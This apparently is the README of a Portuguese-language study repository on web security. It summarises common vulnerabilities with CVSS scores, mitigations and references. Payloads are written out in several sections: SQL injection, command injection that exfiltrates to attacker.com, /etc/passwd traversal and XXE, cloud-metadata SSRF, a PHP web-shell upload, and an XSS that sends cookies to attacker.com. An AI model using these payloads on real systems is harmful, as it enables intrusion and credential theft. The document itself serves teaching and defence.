# 🔐 Cybersecurity Notes

## 🌐 Vulnerabilidades Web

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Status](https://img.shields.io/badge/status-Em%20Desenvolvimento-yellow.svg)]()

Repositório com notas detalhadas sobre vulnerabilidades web, técnicas de exploração, exemplos práticos e contramedidas. Ideal para estudar segurança ofensiva e defensiva.

---

## 📋 Índice

- [Vulnerabilidades Server-Side](#-vulnerabilidades-server-side)
- [Vulnerabilidades Client-Side](#-vulnerabilidades-client-side)
- [Técnicas Avançadas](#-técnicas-avançadas)
- [Referências](#-referências)

---

## 🖥️ Vulnerabilidades Server-Side

### 1. **SQL Injection (SQLi)**
- **CVSS Score:** 9.8 (Crítico)
- **Risco:** Acesso não autorizado a dados, modificação/deleção de registros, RCE
- **Status:** ⚠️ Vulnerabilidade Ativa (OWASP Top 10 #3)
- [📖 Documentação Completa](WEB/sqli.md)

**Exemplos de Uso:**
```sql
-- Contornando autenticação
' OR '1'='1' --

-- Extração de dados via UNION
' UNION SELECT username, password FROM users --

-- Blind SQLi com time-based
'; WAITFOR DELAY '00:00:05' --
```

---

### 2. **OS Command Injection**
- **CVSS Score:** 9.8 (Crítico)
- **Risco:** Execução arbitrária de comandos do SO, comprometimento total do servidor
- **Status:** ⚠️ Vulnerabilidade Ativa (OWASP Top 10 #1)
- [📖 Documentação Completa](WEB/command-injection.md)

**Exemplos de Uso:**
```bash
# Injeção básica
& whoami &

# Execução blind com exfiltração DNS
& nslookup `whoami`.attacker.com &

# Time-based detection
& ping -c 10 127.0.0.1 &
```

---

### 3. **Directory Traversal / Path Traversal**
- **CVSS Score:** 7.5 (Alto)
- **Risco:** Acesso a arquivos sensíveis do sistema
- **Status:** ⚠️ Vulnerabilidade Ativa
- [📖 Documentação Completa](WEB/directory-traversal.md)

**Exemplos de Uso:**
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
```

---

### 4. **XXE Injection (XML External Entity)**
- **CVSS Score:** 8.6 (Alto)
- **Risco:** Leitura de arquivos arbitrários, SSRF, DoS
- **Status:** ⚠️ Vulnerabilidade Ativa (OWASP Top 10 #5)
- [📖 Documentação Completa](WEB/xxe.md)

**Exemplos de Uso:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

### 5. **SSRF (Server-Side Request Forgery)**
- **CVSS Score:** 8.6 (Alto)
- **Risco:** Acesso a serviços internos, ataques em cloud metadata
- **Status:** ⚠️ Vulnerabilidade Ativa (OWASP Top 10 #10)
- [📖 Documentação Completa](WEB/ssrf.md)

**Exemplos de Uso:**
```
http://localhost/admin
http://169.254.169.254/latest/meta-data/
http://internal-api.local/v1/users
```

---

### 6. **File Upload Vulnerabilities**
- **CVSS Score:** 8.8 (Alto)
- **Risco:** RCE via upload de shells, bypass de validações
- **Status:** ⚠️ Vulnerabilidade Ativa
- [📖 Documentação Completa](WEB/file-upload.md)

**Exemplos de Uso:**
```
shell.php                  # Execução direta
shell.phtml               # Contorno de blacklist
shell.php%00.jpg          # Nullbyte injection
shell.php....             # Ponto duplo
GIF89a<?php system($_GET['cmd']); ?>  # Polyglot
```

---

### 7. **Information Disclosure**
- **CVSS Score:** 5.3 (Médio)
- **Risco:** Exposição de dados sensíveis, stack traces, credenciais
- **Status:** ⚠️ Vulnerabilidade Ativa

**Exemplos de Detecção:**
```
- Error messages detalhadas
- Stack traces em respostas
- Comentários HTML/JS com info sensível
- Arquivos de backup expostos (.bak, .tmp)
```

---

### 8. **Access Control & Privilege Escalation**
- **CVSS Score:** 8.1 (Alto)
- **Risco:** Acesso a recursos não autorizados, elevação de privilégios
- **Status:** ⚠️ Vulnerabilidade Ativa (OWASP Top 10 #1)

**Exemplos de Detecção:**
```
- IDOR (Insecure Direct Object Reference): /user/123 → /user/456
- Missing access controls em endpoints
- Privilege escalation horizontal/vertical
```

---

### 9. **Authentication Vulnerabilities**
- **CVSS Score:** 9.1 (Crítico)
- **Risco:** Bypass de autenticação, session hijacking, credential stuffing
- **Status:** ⚠️ Vulnerabilidade Ativa (OWASP Top 10 #2)

**Exemplos de Detecção:**
```
- Brute force sem rate limiting
- Session fixation
- Weak password policies
- Insecure token generation
```

---

## 💻 Vulnerabilidades Client-Side

### 1. **XSS (Cross-Site Scripting)**
- **CVSS Score:** 7.1 (Alto)
- **Risco:** Session hijacking, credential theft, malware distribution
- **Status:** ⚠️ Vulnerabilidade Ativa (OWASP Top 10 #3)

**Exemplos de Uso:**
```javascript
// Reflected XSS
<script>alert('XSS')</script>

// Stored XSS
"><svg onload="fetch('http://attacker.com/log?cookie='+document.cookie)">

// DOM-based
eval(userInput)
```

---

### 2. **CSRF (Cross-Site Request Forgery)**
- **CVSS Score:** 6.5 (Médio)
- **Risco:** Ações não autorizadas em conta da vítima
- **Status:** ⚠️ Vulnerabilidade Ativa

**Exemplos de Detecção:**
```html
<!-- Token CSRF em formulário -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="...">
</form>
```

---

### 3. **CORS (Cross-Origin Resource Sharing)**
- **CVSS Score:** 7.3 (Alto)
- **Risco:** Acesso não autorizado a recursos de origem diferente
- **Status:** ⚠️ Vulnerabilidade Ativa

**Exemplos de Detecção:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

---

### 4. **Clickjacking**
- **CVSS Score:** 6.1 (Médio)
- **Risco:** Execução de ações enganosas, roubo de credenciais
- **Status:** ⚠️ Vulnerabilidade Ativa

---

### 5. **DOM-Based Vulnerabilities**
- **CVSS Score:** 6.1 (Médio)
- **Risco:** XSS, open redirect, DoS
- **Status:** ⚠️ Vulnerabilidade Ativa

---

### 6. **WebSockets Vulnerabilities**
- **Risco:** Acesso não autorizado, data exfiltration
- **Status:** ⚠️ Vulnerabilidade Ativa
- [📖 Documentação Completa](WEB/websockets.md)

---

## 🚀 Técnicas Avançadas

- Polyglot files (múltiplos tipos de arquivo)
- Encoding bypasses (Unicode, double encoding, etc.)
- WAF/IPS evasion techniques
- Race condition exploits
- Insecure deserialization
- Server-Side Template Injection (SSTI)
- Logic bypass techniques

---

## 🔍 Reverse Engineering

- [📖 Documentação Completa](REVERSE_ENGINEERING/README.md)
- [Análise Estática](REVERSE_ENGINEERING/static-analysis.md) - Disassembly & Decompilation
- [Análise Dinâmica](REVERSE_ENGINEERING/dynamic-analysis-frida.md) - Instrumentação com Frida
- Ferramentas: IDA Pro, Ghidra, Radare2, Cutter, Frida

---

## 🔐 Cryptography - Falhas Criptográficas

- **CVSS Score:** 9.1 (Crítico) - OWASP #2
- [📖 Documentação Completa](CRYPTO/README.md)
- [Algoritmos Fracos](CRYPTO/weak-algorithms.md)
- [Gerenciamento de Chaves](CRYPTO/insecure-key-management.md)
- [Hash de Senhas](CRYPTO/weak-password-hashing.md)

---

## 📱 Mobile Security

- **Plataformas:** Android, iOS
- [📖 Documentação Completa](MOBILE/README.md)
- [Armazenamento Inseguro (Android)](MOBILE/android-insecure-storage.md)
- [Componentes Exportados (Android)](MOBILE/android-exported-components.md)
- [iOS Vulnerabilities (Em breve)]()

---

## 🔎 OSINT - Open-Source Intelligence

- **Dificuldade:** Intermediário
- [📖 Documentação Completa](OSINT/README.md)
- [Domain Enumeration](OSINT/domain-enumeration.md) - WHOIS, DNS, Subdomínios
- Reconnaissance de domínios
- Enumeração de subdomínios
- Email harvesting
- Social media analysis
- Google dorking
## 🛡️ Contramedidas Recomendadas

| Vulnerabilidade | Mitigação |
|---|---|
| SQLi | Prepared statements, input validation, parameterized queries |
| Command Injection | Evitar system calls, usar APIs seguras, whitelist |
| XXE | Disable DTD parsing, input validation |
| SSRF | Whitelist URLs, disable unused protocols |
| File Upload | Validate MIME type, rename files, store fora do webroot |
| XSS | Output encoding, CSP headers, input validation |
| CSRF | CSRF tokens, SameSite cookies |
| CORS | Configurar origins específicas, never use `*` com credentials |

---

## 📚 Referências Oficiais

### Plataformas de Aprendizado
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/learning-path) - Laboratórios práticos
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Top 10 vulnerabilidades
- [HackTricks](https://book.hacktricks.xyz/) - Técnicas de exploração
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Repositório de payloads

### Documentação Oficial
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1) - Scoring de vulnerabilidades
- [CWE - Common Weakness Enumeration](https://cwe.mitre.org/) - Classificação de fraquezas
- [CVE - Common Vulnerabilities and Exposures](https://cve.mitre.org/) - Base de dados de CVEs

### Frameworks de Teste
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)

---

## 📝 Licença

Este projeto está sob a licença MIT. Veja [LICENSE](LICENSE) para mais detalhes.

---

## ⚠️ Aviso Legal

Estas notas são apenas para fins educacionais. O uso não autorizado desses conhecimentos para acessar sistemas sem permissão é **ilegal**. Sempre obtenha permissão explícita antes de testar qualquer sistema.

---

**Última atualização:** Agosto 2026 | **Status:** ✅ Ativo e em desenvolvimento
